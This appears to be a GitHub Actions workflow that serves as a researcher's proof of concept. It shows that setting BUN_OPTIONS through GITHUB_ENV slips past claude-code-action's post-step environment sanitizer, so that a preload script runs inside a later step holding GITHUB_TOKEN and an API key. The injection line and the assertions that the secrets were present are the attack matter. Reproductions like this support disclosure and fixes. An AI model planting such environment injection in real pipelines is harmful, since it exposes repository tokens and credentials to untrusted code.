name: BUN_OPTIONS post-step isolation repro

on:
  push:
    branches:
      - lab/anthropic-bun-options-repro
  workflow_dispatch:

permissions:
  contents: read

jobs:
  repro:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6

      - name: Install exact Bun used by claude-code-action
        uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6
        with:
          bun-version: 1.3.14
          no-cache: true

      - name: Pin Bun like claude-code-action
        shell: bash
        run: |
          mkdir -p "$RUNNER_TEMP/action/bin"
          cp "$(command -v bun)" "$RUNNER_TEMP/action/bin/bun"
          chmod +x "$RUNNER_TEMP/action/bin/bun"

      - name: Emulate persistence from untrusted execution
        shell: bash
        run: |
          echo "BUN_OPTIONS=--preload=$GITHUB_WORKSPACE/repro/preload.ts" >> "$GITHUB_ENV"

      - name: Run claude-code-action post-step sanitizer verbatim
        shell: /bin/bash --noprofile --norc -e -o pipefail {0}
        env:
          BASH_ENV: ""
          LD_PRELOAD: ""
          LD_LIBRARY_PATH: ""
          NODE_OPTIONS: ""
          DYLD_INSERT_LIBRARIES: ""
          DYLD_PRELOAD: ""
          DYLD_LIBRARY_PATH: ""
          DYLD_FRAMEWORK_PATH: ""
        run: |
          echo "/usr/bin" >> "$GITHUB_PATH"
          echo "/bin" >> "$GITHUB_PATH"
          {
            echo "BASH_ENV="
            echo "LD_PRELOAD="
            echo "LD_LIBRARY_PATH="
            echo "DYLD_INSERT_LIBRARIES="
            echo "DYLD_PRELOAD="
            echo "DYLD_LIBRARY_PATH="
            echo "DYLD_FRAMEWORK_PATH="
          } >> "$GITHUB_ENV"

      - name: Emulate privileged Bun post-step
        shell: bash
        env:
          GITHUB_TOKEN: ${{ github.token }}
          ANTHROPIC_API_KEY: DUMMY_RESEARCHER_OWNED_VALUE
          REPRO_MARKER: POST_STEP_PRIVILEGED_CONTEXT
        run: |
          BUN_BIN="$RUNNER_TEMP/action/bin/bun"
          "$BUN_BIN" --no-env-file \
            --config="$GITHUB_WORKSPACE/repro/trusted-bunfig.toml" \
            run "$GITHUB_WORKSPACE/repro/target.ts"

      - name: Assert preload executed in privileged environment
        shell: bash
        run: |
          test -f "$RUNNER_TEMP/bun-options-preload-result.json"
          python3 - <<'PY'
          import json, os
          p = os.path.join(os.environ["RUNNER_TEMP"], "bun-options-preload-result.json")
          data = json.load(open(p))
          assert data["preload_executed"] is True
          assert data["github_token_present"] is True
          assert data["anthropic_api_key_present"] is True
          assert data["repro_marker"] == "POST_STEP_PRIVILEGED_CONTEXT"
          print(json.dumps(data, indent=2))
          print("PASS: BUN_OPTIONS preload executed before trusted post-step target with privileged env present.")
          PY

      - name: Upload marker evidence
        uses: actions/upload-artifact@v4
        with:
          name: bun-options-poststep-evidence
          path: ${{ runner.temp }}/bun-options-preload-result.json
